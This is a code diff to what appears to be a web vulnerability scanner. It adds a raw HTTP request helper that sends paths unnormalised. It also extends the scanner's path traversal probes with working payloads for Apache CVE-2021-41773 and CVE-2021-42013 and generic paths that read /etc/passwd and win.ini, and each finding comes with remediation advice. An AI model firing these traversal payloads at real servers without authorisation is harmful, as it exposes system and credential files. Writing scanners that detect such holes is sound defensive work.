@@ -1,7 +1,10 @@
 import json as _json
 import re as _re
+import http.client
+import ssl
 import time
 import requests
+from types import SimpleNamespace
 from urllib.parse import quote
 
 from ...findings import Evidence, Finding, Severity, probe_result, probe_error
@@ -59,6 +62,25 @@ def _traversal_evidence(url, text, needles):
   if not snippet:
     return ()
   return (Evidence(kind="request_response", caption=f"GET {url}", snippet=snippet),)
+
+def _raw_path_get(scheme, host, port, path, timeout):
+  """GET `path` with the request line sent byte for byte (curl `--path-as-is`).
+
+  `requests` normalises `/a/../b` and `.%2e` before sending, so a traversal payload never reaches the
+  server as written. `http.client` writes the path it is given. Returns an object with `status_code` and
+  `text`; raises on a network error.
+  """
+  if scheme == "https":
+    conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ssl._create_unverified_context())
+  else:
+    conn = http.client.HTTPConnection(host, port, timeout=timeout)
+  try:
+    conn.request("GET", path, headers={"User-Agent": "RedMesh", "Connection": "close"})
+    resp = conn.getresponse()
+    return SimpleNamespace(status_code=resp.status, text=resp.read(65536).decode("utf-8", "replace"))
+  finally:
+    conn.close()
+
 
 class _InjectionTestBase:
   """Shared execution engine for injection-style web tests."""
@@ -120,6 +142,7 @@ class _WebInjectionMixin(_InjectionTestBase):
       Structured findings.
     """
     findings_list = []
+    request_errors = []
     scheme = "https" if port in (443, 8443) else "http"
     base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"
 
@@ -127,48 +150,48 @@ class _WebInjectionMixin(_InjectionTestBase):
     win_needles = ("[boot loader]", "[operating systems]", "[fonts]")
 
     # --- 1. Path-based traversal ---
+    # (path, needles, CVE the payload proves). Sent unnormalised: see `_raw_path_get`.
     path_payloads = [
-      "/../../../../etc/passwd",
-      "/..%2f..%2f..%2f..%2fetc/passwd",
-      "/....//....//....//....//etc/passwd",
-      "/../../../../windows/win.ini",
+      ("/../../../../etc/passwd", unix_needles, None),
+      ("/..%2f..%2f..%2f..%2fetc/passwd", unix_needles, None),
+      ("/....//....//....//....//etc/passwd", unix_needles, None),
+      ("/../../../../windows/win.ini", win_needles, None),
+      # Apache 2.4.49 (CVE-2021-41773) decodes `%2e` after the dot-segment check.
+      ("/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", unix_needles, "CVE-2021-41773"),
+      # Apache 2.4.50 (CVE-2021-42013) decodes a double-encoded `%%32%65`.
+      ("/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd", unix_needles, "CVE-2021-42013"),
     ]
-    for payload_path in path_payloads:
+    for payload_path, needles, cve_id in path_payloads:
       if len(findings_list) >= 3:
         break
       try:
         url = base_url.rstrip("/") + payload_path
-        resp = requests.get(url, timeout=self._target_timeout(2), verify=False)
-        if any(n in resp.text for n in unix_needles):
-          findings_list.append(Finding(
-            severity=Severity.HIGH,
-            cvss_vector=V.SENSITIVE_DATA_EXPOSED,
-            title=f"Path traversal: /etc/passwd via path",
-            description=f"Server returned /etc/passwd content via path traversal.",
-            evidence=f"URL: {url}, body contains passwd markers",
-            evidence_items=_traversal_evidence(url, resp.text, unix_needles),
-            remediation="Sanitize path components; use a web application firewall.",
-            owasp_id="A01:2021",
-            cwe_id="CWE-22",
-            confidence="certain",
-          ))
-          break
-        if any(n in resp.text for n in win_needles):
-          findings_list.append(Finding(
-            severity=Severity.HIGH,
-            cvss_vector=V.SENSITIVE_DATA_EXPOSED,
-            title=f"Path traversal: win.ini via path",
-            description=f"Server returned Windows system file content.",
-            evidence=f"URL: {url}, body contains win.ini markers",
-            evidence_items=_traversal_evidence(url, resp.text, win_needles),
-            remediation="Sanitize path components.",
-            owasp_id="A01:2021",
-            cwe_id="CWE-22",
-            confidence="certain",
-          ))
-          break
-      except Exception:
-        pass
+        resp = _raw_path_get(scheme, target, port, payload_path, self._target_timeout(2))
+        if not any(n in resp.text for n in needles):
+          continue
+        is_unix = needles is unix_needles
+        findings_list.append(Finding(
+          severity=Severity.CRITICAL if cve_id else Severity.HIGH,
+          cvss_vector=V.SENSITIVE_DATA_EXPOSED,
+          title=(f"{cve_id}: Apache path traversal reads /etc/passwd" if cve_id
+                 else "Path traversal: /etc/passwd via path" if is_unix else "Path traversal: win.ini via path"),
+          description=("Server returned /etc/passwd content through an unnormalised, encoded path "
+                       "(read-only GET, nothing executed)." if cve_id else
+                       "Server returned /etc/passwd content via path traversal." if is_unix else
+                       "Server returned Windows system file content."),
+          evidence=f"URL: {url}, body contains {'passwd' if is_unix else 'win.ini'} markers",
+          evidence_items=_traversal_evidence(url, resp.text, needles),
+          remediation=("Upgrade Apache httpd to 2.4.51 or later." if cve_id
+                       else "Sanitize path components; use a web application firewall."),
+          owasp_id="A01:2021",
+          cwe_id="CWE-22",
+          confidence="certain",
+          **({"cve": (cve_id,), **probe_cve_fields(cve_id)} if cve_id else {}),
+        ))
+        break
+      except Exception as exc:
+        self.P(f"Path traversal request failed on {target}:{port}: {exc}", color='y')
+        request_errors.append(f"{payload_path}: {type(exc).__name__}: {exc}")
 
     # --- 2. Query parameter traversal ---
     params = ["file", "path", "page", "doc", "template", "include", "name"]
@@ -202,7 +225,8 @@ class _WebInjectionMixin(_InjectionTestBase):
         except Exception:
           pass
 
-    return probe_result(findings=findings_list)
+    return probe_result(
+      raw_data={"request_errors": request_errors} if request_errors else None, findings=findings_list)
 
 
   @register_probe(
